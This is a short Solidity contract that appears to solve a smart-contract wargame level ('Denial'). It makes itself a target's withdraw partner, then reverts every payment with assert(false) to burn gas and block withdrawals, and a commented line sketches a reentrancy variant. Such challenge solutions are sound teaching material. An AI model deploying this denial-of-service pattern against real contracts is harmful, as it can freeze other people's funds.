// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


interface IDenial {
  function setWithdrawPartner(address _partner) external; 
  //function withdraw() external;
}


contract Deny{

  constructor(address _contractDenial) public {
    IDenial(_contractDenial).setWithdrawPartner(address(this));
  }  

  receive() external payable {
    assert(false); // use up all gas and revert transaction

    // OR reentrancy attack:
    //IDenial(msg.sender).withdraw();
  }
}
